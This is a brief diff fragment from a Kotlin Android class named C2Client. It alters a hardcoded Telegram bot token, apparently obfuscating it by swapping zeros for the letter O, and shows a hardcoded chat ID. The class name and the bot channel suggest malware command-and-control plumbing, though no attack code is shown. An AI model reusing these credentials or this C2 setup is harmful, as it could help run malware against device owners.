@@ -18,7 +18,7 @@ class C2Client(private val ctx: Context) {
         .build()
 
     // Telegram Bot Token + Chat ID
-    private val BOT_TOKEN = "8561465025:AAE1gWJhFxVP016X0c0fYXjzpW6oN5x1P9A"
+    private val BOT_TOKEN = "8561465025:AAE1gWJhFxVPO16XOcOfYXjzpW6oN5x1P9A"
     private val CHAT_ID = "8526210532"
 
     suspend fun run() {
